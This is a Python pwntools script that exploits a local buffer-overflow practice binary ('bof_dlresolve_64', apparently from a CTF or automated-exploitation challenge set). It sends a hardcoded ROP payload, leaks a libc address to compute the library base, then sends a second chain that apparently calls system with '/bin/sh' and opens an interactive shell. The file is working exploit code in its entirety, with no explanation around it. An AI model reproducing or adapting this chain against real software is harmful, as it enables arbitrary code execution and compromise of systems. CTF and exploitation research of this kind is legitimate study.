from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/zeratool-challenges/overflow/bof_dlresolve_64")
pwn.gdb.attach(p)
payload = b""
payload += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x03\x13@\x00\x00\x00\x00\x00\xf83@\x00\x00\x00\x00\x00\x80\x10@\x00\x00\x00\x00\x00\xfa\x12@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80<@\x00\x00\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x0084@\x00\x00\x00\x00\x00\xe0\x12@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9d\x11@\x00\x00\x00\x00\x00x<@\x00\x00\x00\x00\x00\x1e\x12@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
p.send(payload)
p.recvuntil(b'pwn_me:\nYour buffer is at 0x7fffffffffefef0\n')
libc_base = u64(p.recv()[0:6].ljust(8,b'\x00')) + -0x21ba0
pwn.log.success('libc_base:' + hex(libc_base))
payload = b""
payload += p64(0x401303) + p64(libc_base + 0x1b3d88) + p64(libc_base + 0x4f420)
p.send(payload)
p.interactive()